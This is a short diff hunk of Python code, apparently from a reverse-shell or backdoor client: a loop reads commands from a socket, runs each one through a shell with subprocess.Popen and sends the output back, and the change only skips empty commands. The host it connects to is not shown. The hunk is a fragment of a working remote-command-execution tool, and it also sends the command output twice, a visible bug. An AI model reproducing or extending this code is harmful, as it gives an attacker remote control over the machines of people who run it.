@@ -9,7 +9,7 @@ def connect():
         if 'close' in command.decode():
             s.close()
             break
-        else:
+        elif command != '':
             CMD = subprocess.Popen(command.decode(), shell = True, stdout = subprocess.PIPE, stderr = subprocess.PIPE, stdin = subprocess.PIPE)
             s.send(CMD.stdout.read())
             s.send(CMD.stdout.read())
